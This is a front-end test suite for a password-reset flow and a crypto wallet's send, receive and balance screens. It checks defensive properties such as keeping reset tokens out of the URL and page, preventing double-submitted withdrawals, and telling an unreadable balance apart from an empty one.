  it('BJ-SIGNIN-11 ★ T1: the reset link is spent from a form, and its token is never in the address bar, the document or storage', async () => {
    fresh()
    const chosen = 'a-brand-new-passphrase'

    /*
     * THE ADDRESS BAR AT THE INSTANT THE CREDENTIAL WENT OUT, sampled from inside the stub.
     *
     * Read afterwards it would be equally true of a bundle that stripped the hash in the `.then`,
     * which is the mutant BJ-SIGNIN-08's first version passed against. Here the window between
     * landing and posting is not a round trip but however long a human takes to choose a password
     * and type it twice, so an "after" version would leave a live credential in the address bar,
     * the history and any screen share for that entire time.
     */
    let urlWhenSent = '(the request was never made)'

    await withScreen(
      page(h(ResetPasswordPage), '/account/reset'),
      {
        url: `${ORIGIN}/account/reset#token=${LINK_TOKEN}`,
        // MOUNTED THE WAY main.tsx MOUNTS: every effect runs twice. The second run reads a hash the
        // first has already stripped, and an unguarded page would replace this form with "that link
        // is incomplete" — a working link reported as broken, on the one page that works once.
        strict: true,
        routes: {
          [`POST ${RESET_ROUTES.reset}`]: () => {
            urlWhenSent = globalThis.location.href
            return { status: 204 }
          },
        },
      },
      async (s) => {
        await s.settle(20)

        // ── BEFORE ANYTHING IS TYPED: the token is already gone from everywhere a reader,
        // a screenshot, an extension or the next referrer could pick it up.
        assert.ok(
          !s.window.location.href.includes(LINK_TOKEN),
          'the token is still in the address bar while the reader chooses a password',
        )
        assert.ok(
          !s.document.documentElement.outerHTML.includes(LINK_TOKEN),
          'the token is somewhere in the rendered document — a hidden input carrying it is in the ' +
            'page source, in a copied selection and in the accessibility tree',
        )

        await s.type(labelled(s, 'New password'), chosen)
        await s.type(labelled(s, 'Confirm new password'), chosen)
        await s.click(s.byRole('button', 'Set new password'))
        await s.settle(20)

        // ── It was spent exactly once, with the token from the fragment and the password typed.
        const sent = s.api.matching(`POST ${RESET_ROUTES.reset}`)
        assert.equal(sent.length, 1, 'the reset was not submitted exactly once')
        assert.deepEqual(
          sent[0]?.json,
          { token: LINK_TOKEN, newPassword: chosen },
          'the body is not the token from the fragment and the password that was typed',
        )
        assert.ok(
          !urlWhenSent.includes(LINK_TOKEN),
          `the token was still in the address bar when the reset went out: ${urlWhenSent}`,
        )
        assert.ok(!s.storageSnapshot().includes(LINK_TOKEN), 'the link token was persisted')
        assert.ok(
          !s.document.documentElement.outerHTML.includes(LINK_TOKEN),
          'the token reached the document on the way to being spent',
        )

        // ── And the reader is told the consequence they would otherwise discover on three
        // devices: identity revokes every refresh family on a reset (SD-04).
        assert.match(s.text(), /signed out/i, 'the screen does not say the other sessions ended')
        s.byRole('link', 'Sign in')
        s.clean('the password reset')
      },
    )
  })

  it('BJ-SIGNIN-12 ★ T1: the reset address a mail scanner pre-fetches spends nothing and offers a new link', async () => {
    fresh()
    // A pre-fetch is a GET of the path with NO fragment — browsers do not transmit one, which is
    // the entire reason the token lives there. This is that request, modelled exactly.
    await withScreen(
      page(h(ResetPasswordPage), '/account/reset'),
      {
        url: `${ORIGIN}/account/reset`,
        // Routes that WOULD answer, so a bundle that posted something cannot pass by rendering a
        // failure it caused itself.
        routes: {
          [`POST ${RESET_ROUTES.reset}`]: { status: 204 },
          [`POST ${RESET_ROUTES.forgot}`]: { status: 202, body: { status: 'unused here' } },
        },
      },
      async (s) => {
        await s.settle(20)
        assert.equal(
          s.api.matching(`POST ${RESET_ROUTES.reset}`).length,
          0,
          'opening the link without a fragment posted something — corporate mail security opens ' +
            'every link in every message, and this is where a single-use credential would be ' +
            'spent before the person it was sent to ever clicked it',
        )
        assert.equal(s.navigations.length, 0, 'a pre-fetch navigated somewhere')
        // And it is not a dead end: the form that asks for another link is on the page, because
        // this route answers identically for every address and therefore may be offered publicly.
        s.byRole('button', 'Send a reset link')
        s.clean('the reset pre-fetch')
      },
    )
  })

  it('BJ-SIGNIN-14 T1: a refused new password shows every sentence identity sent, under the field it named', async () => {
    fresh()
    /*
     * TWO sentences, both under one field name, which is what identity actually sends: its
     * `fields` array carries one entry per failing rule and `checkPassword` names them all
     * `newPassword`. They are the scenario's own strings — nothing here knows or asserts what the
     * policy is, only that what the server said is what the reader is shown.
     */
    const FIRST = 'That one is far too short for this account.'
    const SECOND = 'That one repeats part of your address back at you.'
    const typed = 'short'

    await withScreen(
      page(h(ResetPasswordPage), '/account/reset'),
      {
        url: `${ORIGIN}/account/reset#token=${LINK_TOKEN}`,
        routes: {
          [`POST ${RESET_ROUTES.reset}`]: {
            status: 400,
            body: {
              error: {
                code: 'bad_request',
                message: 'that password is not acceptable',
                requestId: 'req-stub-0001',
                fields: [
                  { field: 'newPassword', code: 'one', message: FIRST },
                  { field: 'newPassword', code: 'two', message: SECOND },
                ],
              },
            },
          },
        },
      },
      async (s) => {
        await s.settle(20)
        await s.type(labelled(s, 'New password'), typed)
        await s.type(labelled(s, 'Confirm new password'), typed)
        await s.click(s.byRole('button', 'Set new password'))
        await s.settle(20)

        // BOTH, not the last one. A Map built from pairs keeps only the final entry for a repeated
        // key, and that shape told the reader one rule at a time out of a response that had
        // already listed them all — at the cost, on this page, of a fresh mailed link per round.
        const shown = s.text()
        assert.ok(shown.includes(FIRST), 'the first sentence identity sent is not on screen')
        assert.ok(shown.includes(SECOND), 'the second sentence identity sent is not on screen')

        // And nothing was cleared. 05:91, and it matters more here than on any other form in the
        // estate: this reader cannot simply try again, because a fresh attempt needs a fresh link.
        assert.equal(valueOf(s, 'reset-password'), typed, 'the password field was cleared')
        assert.equal(valueOf(s, 'reset-confirm'), typed, 'the confirmation field was cleared')
        assert.ok(
          !s.document.documentElement.outerHTML.includes(LINK_TOKEN),
          'a refusal put the token into the document',
        )
        s.clean('a refused new password')
      },
    )
  })

  it('BJ-SIGNIN-13 ★ T1: asking for a reset renders identity’s sentence, and ends on the same screen whatever came back', async () => {
    fresh()
    /*
     * The scenario's own inputs, both of them.
     *
     * `SENTENCE` is written here and stubbed as the response, then looked for on the page — two
     * observations of one value in opposite directions, never a constant imported from `src/`.
     * `TYPED` is deliberately not an address: what is being proved is that this bundle sends it
     * anyway. A client-side "that is not an email" would answer instantly for a malformed address
     * and after a round trip for a real one, which is a timing oracle built in the one place it is
     * easiest to measure.
     */
    const SENTENCE = 'If that account exists, something has been recorded. It expires and works once.'
    const TYPED = 'not-an-address'

    await withScreen(
      page(h(ForgotPasswordPage), '/account/forgot'),
      {
        url: `${ORIGIN}/account/forgot`,
        routes: { [`POST ${RESET_ROUTES.forgot}`]: { status: 202, body: { status: SENTENCE } } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), TYPED)
        await s.click(s.byRole('button', 'Send a reset link'))
        await s.settle(20)

        const asked = s.api.matching(`POST ${RESET_ROUTES.forgot}`)
        assert.equal(asked.length, 1, 'the request was not made exactly once')
        assert.deepEqual(
          asked[0]?.json,
          { email: TYPED },
          'the address was judged in the browser instead of being sent for identity to decide',
        )
        assert.ok(s.text().includes(SENTENCE), 'identity’s own sentence is not what is on screen')
        s.clean('the reset request')
      },
    )

    // ── THE SECOND HALF: a completely different answer, and the same screen.
    //
    // identity answers 202 for every input, so any other status is a fact about the SERVICE and
    // never about the address — and a screen that reported it would be a screen whose shape
    // depends on something, which is the whole property this route is built not to have.
    fresh()
    await withScreen(
      page(h(ForgotPasswordPage), '/account/forgot'),
      {
        url: `${ORIGIN}/account/forgot`,
        routes: {
          [`POST ${RESET_ROUTES.forgot}`]: {
            status: 500,
            body: { error: { code: 'internal', message: 'the mailer fell over' } },
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), 'someone@example.com')
        await s.click(s.byRole('button', 'Send a reset link'))
        await s.settle(20)

        assert.ok(
          s.queryByRole('button', 'Send a reset link') === null,
          'the form is still on screen, so this answer and a 202 do not look the same',
        )
        assert.ok(
          !s.text().includes('the mailer fell over'),
          'the service’s own failure was rendered, which is a difference a prober can measure',
        )
        assert.ok(s.queryByRole('status', /account exists/) !== null, 'no confirmation was reached')
      },
    )
  })
})

/**
 * An access token whose payload says what this scenario needs it to say.
 *
 * UNSIGNED, and that is the point rather than a shortcut: `lib/claims.ts` reads these two fields
 * for DISPLAY and verifies nothing, because every service verifies the token on the request
 * itself. A test that had to mint a real signature would be asserting that this bundle validates
 * credentials, which it must not do and does not claim to.
 *
 * No credential appears here or anywhere in this suite — the payload is two public display fields
 * and the signature segment is the literal word `unsigned`.
 */
function unsignedToken(payload: Record<string, unknown>): string {
  const b64url = (value: string): string =>
    Buffer.from(value, 'utf8').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
  return `${b64url(JSON.stringify({ alg: 'none' }))}.${b64url(JSON.stringify(payload))}.unsigned`
}

/* ── helpers for the sign-in scenarios ──────────────────────────────────────────────────────── */

/**
 * A control addressed by its `<label>` rather than by role.
 *
 * `<input type="password">` has NO role in the ARIA mapping, so `byRole('textbox', 'Password')`
 * would find nothing — and `test/dom.ts` deliberately does not invent one, because a scenario
 * addressing a control by a role a screen reader will never report is addressing it by a fiction.
 * The label is the accessible name either way, which is what doc 22 §2.4.3 asks for.
 */
function labelled(s: Screen, label: string): Element {
  const found = [...s.document.querySelectorAll('label')].filter((l) =>
    (l.textContent ?? '').trim().toLowerCase().startsWith(label.toLowerCase()),
  )
  assert.equal(found.length, 1, `expected exactly one <label> starting "${label}", found ${found.length}`)
  const id = found[0]?.getAttribute('for')
  const control = id ? s.document.getElementById(id) : null
  assert.ok(control, `the label "${label}" points at no control`)
  return control
}

/** The live value of a control, by id. */
function valueOf(s: Screen, id: string): string {
  const el = s.document.getElementById(id)
  assert.ok(el, `no control with id ${id}`)
  return (el as unknown as { value: string }).value
}

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   6.2 Group B — Send. Every row was ⛔ on doc 22 §8.2, "wallet.tsx contains no <form>".
   ══════════════════════════════════════════════════════════════════════════════════════════ */

/** A Send panel with one spendable holding and one of this account's own wallets. */
const sendPanel = (over: { wallets?: readonly ReturnType<typeof fx.wallet>[] } = {}) =>
  h(SendPanel, {
    holdings: [fx.holding()],
    wallets: over.wallets ?? [fx.wallet()],
    onSent: () => undefined,
  })

/** Fill the form and press Review, returning the confirmation step. */
async function arm(s: Screen, destination: string, amount: string): Promise<void> {
  await s.type(s.byRole('textbox', 'Destination address'), destination)
  await s.type(s.byRole('textbox', 'Amount'), amount)
  await s.click(s.byRole('button', 'Review'))
  assert.ok(s.text().includes('Confirm this payment'), 'Review did not arm the confirmation step')
}

/** The destination as the confirmation step RENDERED it, read out of the DOM. */
const destinationShown = (s: Screen): string => {
  const node = s.queryByTestId('confirm-destination')
  assert.ok(node, 'the confirmation step renders no destination')
  return s.textOf(node)
}

/** The destination as it went over the wire, read out of the request body. */
const destinationPosted = (s: Screen, n = 0): string => {
  const posted = s.api.matching('POST /v1/withdrawals')[n]
  assert.ok(posted, `there was no withdrawal request number ${n + 1}`)
  return (posted.json as { destination: string }).destination
}

describe('BJ-WAL — Send', () => {
  it('BJ-WAL-08 ★ T1: the destination submitted is the destination rendered, character for character', async () => {
    fresh()
    // MIXED CASE ON PURPOSE. The guard on this screen was proven by inserting a `.toLowerCase()`
    // between the confirmation step and the wire; against an all-lower-case address that mutation
    // is invisible, and the scenario would pass over the top of it.
    const typed = fx.MIXED_CASE_ADDRESS
    assert.notEqual(typed, typed.toLowerCase(), 'this fixture cannot detect a case fold')

    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: { 'POST /v1/withdrawals': { status: 201, body: { withdrawal: fx.withdrawal({ destination: typed }), replayed: false } } },
      },
      async (s) => {
        await arm(s, typed, '1.5')

        // The confirmation renders it IN FULL. A shortened address on a confirmation step is a
        // confirmation of the first eight characters, which is exactly what a substitution is
        // designed to survive.
        const shown = destinationShown(s)
        assert.equal(shown, typed, 'the confirmation step is not showing what was typed')
        assert.ok(!shown.includes('…'), 'the confirmation step shortened the address')

        // Captured BEFORE the commit, because the confirmation step is replaced by the receipt and
        // a comparison made afterwards would be reading the service's echo rather than what the
        // user was shown. The whole scenario is that those two can differ.
        const amountConfirmed = factValue(s, 'Amount')

        await s.click(s.byRole('button', 'Send it'))

        // THE ASSERTION THIS SCREEN EXISTS FOR. Three observations of one value, taken in three
        // different places: the scenario's own input, the DOM node, and the request body.
        const posted = destinationPosted(s)
        assert.equal(posted, shown, 'the address SUBMITTED is not the address SHOWN')
        assert.equal(posted, typed, 'the address submitted is not the address typed')

        // The amount too: the confirmation renders smallest units beside the human form, and the
        // smallest-units figure is what is sent. 1.5 EMBER at eighteen decimals.
        const body = s.api.matching('POST /v1/withdrawals')[0]?.json as Record<string, string>
        assert.ok(
          amountConfirmed.includes(body['amount'] as string),
          `the units posted (${body['amount']}) were not on the confirmation ("${amountConfirmed}")`,
        )
        assert.equal(body['assetCode'], 'EMBER')
        // Exactly three fields. A body carrying a fourth would be this form sending something the
        // confirmation step never rendered, which is the same defect wearing a different hat.
        assert.deepEqual(Object.keys(body).sort(), ['amount', 'assetCode', 'destination'])
      },
    )
  })

  it('BJ-WAL-08 ★ T1 (second half): the fee is stated as unknown before confirmation, never invented', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: { 'POST /v1/withdrawals': { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false } } },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        // `micro-wallet` quotes the fee inside the POST and serves no route that quotes one, so
        // there is no figure to show. What must NOT happen is a number appearing beside "Network
        // fee" — a made-up figure on a confirmation step is worse than an honest absence.
        const confirmFee = factValue(s, 'Network fee')
        assert.ok(!/\d/.test(confirmFee), `the confirmation invented a fee: ${confirmFee}`)
        assert.match(confirmFee, /priced at the moment you confirm|subtracted from the amount/i, 'the confirmation does not say the fee is not yet known')
        // And no quote route was called. `wallet/src/pricingclient.ts` came to call a `/v1/quotes`
        // that has never existed by exactly this route; test/dom.ts would throw on it here.
        assert.equal(s.api.wire.length, 0, 'the confirmation step made a request')

        await s.click(s.byRole('button', 'Send it'))
        // The receipt states it where it becomes known, from the service's own record.
        const served = (s.api.matching('POST /v1/withdrawals')[0] && fx.withdrawal().fee) as string
        assert.ok(s.text().includes('Withdrawal requested'), 'no receipt')
        assert.ok(factValue(s, 'Network fee').length > 0)
        assert.ok(served.length > 0)
      },
    )
  })

  it('BJ-WAL-09 T1: double-submit the confirm button — exactly one withdrawal leaves the browser', async () => {
    fresh()
    let posts = 0
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/withdrawals': () => {
            posts += 1
            // Slow enough that a second press lands while the first is still in flight, which is
            // the only interleaving in which a double-submit can produce two effects.
            return { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false }, delayMs: 20 }
          },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        const send = s.byRole('button', 'Send it')
        // Both presses land before the first response — which is the hazard. `clickNoFlush` is
        // deliberate: awaiting between them would test a case a double-click never produces.
        s.clickNoFlush(send)
        s.clickNoFlush(send)
        await s.settle(40)

        const posted = s.api.matching('POST /v1/withdrawals')

        // ── THE COUNT. THIS ASSERTION USED TO BE `posted.length >= 1` ─────────────────────────
        //
        // Doc 22's row reads "exactly one withdrawal request leaves the browser", and this line
        // used to decline to check it, under a comment claiming the count was "a property of the
        // harness's scheduling rather than of the screen" because in a real browser "two clicks
        // are two discrete events and React flushes state between them".
        //
        // Both halves were false, and the assertion they justified — `>= 1` against a control
        // that had just been pressed — could not fail. React does not flush between two clicks
        // dispatched in one task, which is precisely why `micro-beacon`'s BJ-WAL-09 dispatches
        // both from a single `page.evaluate` in real Chromium, and why it found TWO POSTs against
        // the `if (!armed || busy)` guard that used to be in `components/send.tsx`.
        //
        // The harness is stricter here than a browser rather than looser: two dispatches inside
        // one `act()` is the worst case, not an unreachable one. `test/double-submit.test.ts`
        // proves that directly — it mounts a control with NO latch and asserts both handlers
        // observe the same pre-click state — and repeats every scenario under `<StrictMode>`.
        assert.equal(
          posted.length,
          1,
          `two synchronous presses of Confirm sent ${posted.length} withdrawal request(s). The ` +
            `guard is the ref latch in components/send.tsx, not \`busy\`: \`setBusy(true)\` only ` +
            `schedules a render, so both clicks read the same pre-click state.`,
        )

        // ── AND THE KEY, WHICH IS A SEPARATE CONTRACT ─────────────────────────────────────────
        //
        // One intent, one key, and `wallet/src/server.ts` collapses duplicates on the
        // strength of it. That is what makes a genuine RETRY safe, and it is orthogonal to the
        // count: a key minted per fetch — the defect `lib/idempotency.ts` exists to prevent
        // — makes two requests two withdrawals no matter how well the button guards itself. It is
        // asserted separately so that a regression in either is legible on its own.
        const keys = new Set(posted.map((p) => p.headers['idempotency-key']))
        assert.equal(
          keys.size,
          1,
          `two presses of one intent sent ${keys.size} idempotency keys: ${[...keys].join(', ')}. ` +
            `A key minted per fetch means two presses are two withdrawals.`,
        )
        assert.match([...keys][0] ?? '', /^withdraw:/, 'the key does not name the intent it is for')
        // Every attempt carried the same body, too: one key over two different bodies is a 409
        // from the service and would be this bundle's bug rather than the user's.
        for (const p of posted) assert.deepEqual(p.json, posted[0]?.json)
        // The stub's own counter and the recorded wire agree. Two independent observations of the
        // same number, so the count above cannot pass because the harness stopped recording.
        assert.equal(posts, posted.length, 'the stub was entered a different number of times than was recorded')
      },
    )
  })

  it('BJ-WAL-09 T1 (replay): a 200 with replayed:true is the mechanism working, not an error', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        // `wallet/src/server.ts` answers 200 with the FIRST withdrawal for a repeat of one
        // key. A client that rendered that as a failure would invite the user to send a second.
        routes: { 'POST /v1/withdrawals': { status: 200, body: { withdrawal: fx.withdrawal(), replayed: true } } },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))
        // BOTH, not either. This was `/Already requested|does not send twice/` and a mutation that
        // hard-coded the heading to "Withdrawal requested" survived it: the alternation let the
        // note cover for the heading, so half the screen could be wrong and the guard still pass.
        assert.match(s.text(), /Already requested/i, 'a replay is titled as a fresh withdrawal')
        assert.match(s.text(), /does not send a second one/i, 'a replay is not explained to the user')
        assert.equal(s.allByRole('alert').length, 0, 'a replay was rendered as an error')
        // The receipt reads back off the SERVICE's record, not off the form.
        assert.ok(s.text().includes(fx.withdrawal().state), 'the receipt does not carry the service’s state')
      },
    )
  })

  it('BJ-WAL-10 T1: the back button after the confirmation step does not re-arm a second submit', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: { 'POST /v1/withdrawals': { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false } } },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))
        assert.equal(s.api.matching('POST /v1/withdrawals').length, 1)

        await s.back()

        // The armed intent is component state and the history entry is not a form. There is no
        // control on screen that would commit again, and nothing was sent by going back.
        assert.equal(s.queryByRole('button', 'Send it'), null, 'the back button re-armed the commit')
        assert.equal(s.api.matching('POST /v1/withdrawals').length, 1, 'going back sent a second withdrawal')
        // The form is empty again rather than pre-armed: a fresh intent needs a fresh review.
        assert.equal(valueOf(s, 'send-destination'), '', 'the settled destination is still in the form')
      },
    )
  })

  it('BJ-WAL-11 T1: a refused withdrawal states the reason with its request id and lists nothing', async () => {
    fresh()
    const serverSentence = 'There is not enough available to cover that withdrawal.'
    const requestId = 'cf-req-88f1'
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/withdrawals': {
            status: 422,
            requestId,
            body: fx.errorBody('insufficient_funds', serverSentence, [], requestId),
          },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))

        // The SENTENCE the user is shown, never the refusal itself — doc 22 §3.
        assert.ok(s.text().includes(serverSentence), 'the service’s reason is not on the page')
        assert.ok(s.text().includes(requestId), 'the request id is not on the page')
        // Nothing moved. There is no receipt, so nothing claims a withdrawal was made.
        assert.ok(!s.text().includes('Withdrawal requested'), 'a refusal rendered a receipt')
      },
    )
  })
})

/** The `<dd>` following the `<dt>` with this text, in a `<dl class="wt-facts">`. */
function factValue(s: Screen, term: string): string {
  const dt = [...s.document.querySelectorAll('dt')].find(
    (el) => (el.textContent ?? '').trim() === term,
  )
  assert.ok(dt, `no <dt> reading "${term}" on the page`)
  const dd = dt.nextElementSibling
  assert.equal(dd?.tagName.toLowerCase(), 'dd', `the <dt> "${term}" is not followed by a <dd>`)
  return s.textOf(dd)
}

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   The whole Wallet page — what an unread balance looks like, and what an empty one looks like.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

/**
 * The wallet page with the tiles a scenario names, and custody answering nothing.
 *
 * The token-sightings route is answered EMPTY by default rather than left unrouted. `test/dom.ts`
 * throws on an unrouted request, and the panel that calls this one swallows a failure by design —
 * so an unrouted default would let every wallet scenario here go green while the request that
 * reaches a real estate was malformed. Answering it makes the empty case an observation.
 */
const walletPageAt = (
  tiles: Parameters<typeof fx.dashboard>[0],
  exports: unknown[] = [],
  sightings: readonly unknown[] = [],
) => ({
  element: page(h(WalletPage), '/wallet'),
  options: {
    url: `${ORIGIN}/wallet`,
    routes: {
      'GET /v1/dashboard': { body: fx.dashboard(tiles) },
      'GET /v1/exports': { body: { exports } },
      'GET /v1/deposits/token-sightings': { body: { sightings, nextCursor: null } },
    } as Routes,
  },
})

/** The `<section>` whose heading is `title`. */
function panel(s: Screen, title: string): Element {
  const found = [...s.document.querySelectorAll('section')].filter(
    (sec) => (sec.querySelector('h2')?.textContent ?? '').trim() === title,
  )
  assert.equal(found.length, 1, `expected exactly one panel titled "${title}", found ${found.length}`)
  return found[0] as Element
}

describe('BJ-WAL-07 — an empty strip may be correct rather than broken', () => {
  /**
   * ── WHY THIS SCENARIO ASSERTS A DISTINCTION AND NOT A NUMBER ─────────────────────────────────
   *
   * `BigInt('')` is `0n`. It does not throw, and neither does `BigInt(' ')`. So the cheap way to
   * render a balance turns a missing figure into a confident, correctly-formatted zero — and a
   * zero on a wallet screen is a statement about somebody's money that nobody questions.
   *
   * The countermeasure is that a strip which cannot obtain a figure prints NO DIGIT at all. Which
   * means an empty strip is ambiguous on its face: it is correct when the tile answered with
   * nothing, and it is a fault when the tile did not answer. A scenario that asserted "no digits"
   * would pass for both, and a scenario that asserted a number would fail on the correct one.
   *
   * So both are rendered in the same run, from the same response, and what is asserted is that a
   * reader can tell them apart in WORDS.
   */
  it('BJ-WAL-07 T1: the unread strip names its upstream and prints no digit; the empty one says what was asked', async () => {
    fresh()
    const reason = 'the wallet service did not answer'
    const { element, options } = walletPageAt({
      // Did not answer. Its `data` is still the empty value, which is the trap: `[]` drawn without
      // its status reads as "you have no wallets" (`lib/tile.ts`).
      wallets: fx.unavailable([], 'wallet', reason),
      // Answered, with nothing.
      deposits: fx.ok([], 'wallet'),
      // Answered, with something — so the page is not uniformly blank and the independence of the
      // three strips is observable in the same run.
      withdrawals: fx.ok([fx.withdrawalRecord()], 'wallet'),
    })

    await withScreen(element, options, async (s) => {
      const unread = s.textOf(panel(s, 'Addresses'))
      const answered = s.textOf(panel(s, 'Arriving'))
      const populated = s.textOf(panel(s, 'Leaving'))

      // 1. THE UNREAD STRIP PRINTS NO DIGIT. Not a zero, not a dash standing in for one.
      assert.ok(!/\d/.test(unread), `the unread strip printed a figure: "${unread}"`)
      // 2. It names WHICH upstream, because "the wallet panel is missing" and "wallet is down" are
      //    different facts and only the second tells an operator where to look.
      assert.ok(unread.includes('wallet'), 'the unread strip does not name its upstream')
      assert.ok(unread.includes(reason), 'the unread strip does not carry the service’s own reason')
      // 3. And it is announced, not merely styled: `role="alert"` for the warning tone.
      assert.ok(
        panel(s, 'Addresses').querySelector('[role="alert"]'),
        'an unavailable strip is not announced',
      )

      // 4. THE ANSWERED-EMPTY STRIP SAYS WHAT WAS ASKED. It also prints no digit — which is why
      //    "no digit" alone cannot be the assertion — but it is a positive statement about a
      //    question that was answered, and it names no upstream because none failed.
      assert.ok(!/\d/.test(answered), `the empty strip printed a figure: "${answered}"`)
      assert.match(answered, /No deposit is currently confirming/i, 'the empty strip says nothing')
      assert.ok(!answered.includes('did not answer'), 'an answered strip claims an outage')

      // 5. THE TWO ARE DIFFERENT SENTENCES. This is the whole scenario: a reader must be able to
      //    tell "there is nothing" from "we could not find out".
      assert.notEqual(unread, answered, 'unread and empty render the same words')
      //    And specifically: the unread strip does NOT also render the answered-empty sentence.
      //    Without this line a mutation that rendered `children ?? empty` unconditionally survived
      //    — the panel then said BOTH "wallet did not answer" and "No wallet has been created or
      //    connected yet", and every other assertion here still passed. Two contradictory
      //    sentences in one strip is worse than either alone, because the reader picks one.
      assert.ok(
        !/No wallet has been created or connected/i.test(unread),
        `the unread strip also rendered the empty-state sentence: "${unread}"`,
      )
      assert.ok(!/^No /i.test(unread.replace(/^[^A-Za-z]+/, '')), 'the unread strip opens with a claim')

      // 6. The strip that DID answer with something is unaffected. One upstream failing does not
      //    blank the page — 05's rule, and hub-api answers 200 with holes precisely for it.
      assert.ok(populated.includes(fx.withdrawalRecord().amountFormatted), 'the healthy strip lost its data')
      assert.ok(populated.includes(fx.withdrawalRecord().state), 'the healthy strip lost its state')
    })
  })

  it('BJ-WAL-07 T1: an unread balance is not reported to the user as having nothing to send', async () => {
    fresh()
    const reason = 'the ledger did not answer'
    // Both derived lists are unread. Before this was fixed, both panels said the opposite of the
    // truth — "There is no balance to send" and "There is no managed wallet to export" — because
    // `hasAnswer(t) ? t.data : []` collapses an outage and an empty account into one empty array.
    const { element, options } = walletPageAt({
      portfolio: fx.unavailable(fx.portfolio({ holdings: [] }), 'ledger', reason),
      wallets: fx.unavailable([], 'wallet', 'the wallet service did not answer'),
    })

    await withScreen(element, options, async (s) => {
      const send = s.textOf(panel(s, 'Send'))
      assert.ok(
        !/there is no balance/i.test(send),
        `the Send panel told the user they have nothing to send while the balance was unreadable: "${send}"`,
      )
      assert.ok(send.includes(reason), 'the Send panel does not carry the reason the balance is missing')
      assert.ok(!/\d/.test(send), `the Send panel printed a figure it could not have: "${send}"`)

      const exportPanel = s.textOf(panel(s, 'Export a private key'))
      assert.ok(
        !/there is no managed wallet/i.test(exportPanel),
        `the export panel said CloudsForge holds no key while the wallet list was unreadable: "${exportPanel}"`,
      )

      // And no control is offered that would post an amount against a balance nobody could read.
      assert.equal(s.queryByRole('button', 'Review'), null, 'Send is armed against an unread balance')
    })
  })

  it('BJ-WAL-07 T1 (the other half): an account that genuinely holds nothing still says so plainly', async () => {
    fresh()
    // The same screen, the same empty lists — but every tile ANSWERED. The sentences must be the
    // positive ones, or the fix above would have turned every empty account into a fake outage.
    const { element, options } = walletPageAt({
      portfolio: fx.ok(fx.portfolio({ holdings: [] }), 'ledger+pricing'),
      wallets: fx.ok([], 'wallet'),
    })

    await withScreen(element, options, async (s) => {
      const send = s.textOf(panel(s, 'Send'))
      assert.match(send, /There is no balance to send/i, 'an answered-empty account was told it was an outage')
      assert.ok(!/could not read/i.test(send), 'an answered-empty account was told it was an outage')

      const addresses = s.textOf(panel(s, 'Addresses'))
      assert.match(addresses, /No wallet has been created or connected/i)
      assert.ok(!addresses.includes('did not answer'), 'an answered-empty list claims an outage')
    })
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   Receive. BJ-WAL-16 and BJ-WAL-17 were ⛔ on §8.2.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-WAL — Receive', () => {
  it('BJ-WAL-16 T1: the address rendered is the address in the response, in full', async () => {
    fresh()
    // The scenario's own value, supplied to the stub and then looked for on the page. One
    // direction only: the page never told this test what to expect.
    const assigned = '0xFEEDfaceFEEDfaceFEEDfaceFEEDfaceFEEDface'
    await withScreen(
      page(h(ReceivePanel, { holdings: [fx.holding()] }), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/deposits': {
            body: {
              assignment: {
                id: 'asg-1',
                assetCode: 'EMBER',
                chain: 'hearth',
                network: 'mainnet',
                walletId: 'wal-1',
                address: assigned,
                status: 'active',
                assignedAt: '2026-08-03T09:00:00.000Z',
                watchedAt: '2026-08-03T09:00:05.000Z',
              },
            },
          },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /deposit address/i))
        assert.equal(factValue(s, 'Send EMBER to'), assigned, 'the address shown is not the one assigned')
        assert.ok(!s.text().includes('…'), 'a deposit address was shortened')
        // `rotate` is an explicit ask and must default to false: defaulting to it would mint a new
        // address on every page load and leave a trail of addresses nobody was told about.
        assert.deepEqual(s.api.matching('POST /v1/deposits')[0]?.json, { assetCode: 'EMBER' })
      },
    )
  })

  it('BJ-WAL-16 T1: an unwatched address says so rather than looking ready to be paid', async () => {
    fresh()
    await withScreen(
      page(h(ReceivePanel, { holdings: [fx.holding()] }), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/deposits': {
            body: {
              assignment: {
                id: 'asg-2',
                assetCode: 'EMBER',
                chain: 'hearth',
                network: 'mainnet',
                walletId: 'wal-1',
                address: fx.OWN_ADDRESS,
                status: 'active',
                assignedAt: '2026-08-03T09:00:00.000Z',
                // "An unwatched address produces no events" — a deposit to it lands on chain and
                // is never credited. Presentation relative to what the API returned in this run.
                watchedAt: null,
              },
            },
          },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /deposit address/i))
        assert.ok(s.allByRole('alert').length > 0, 'an unwatched address is not announced')
        assert.match(s.text(), /not yet watching|would not be credited/i, 'the risk is not stated')
      },
    )
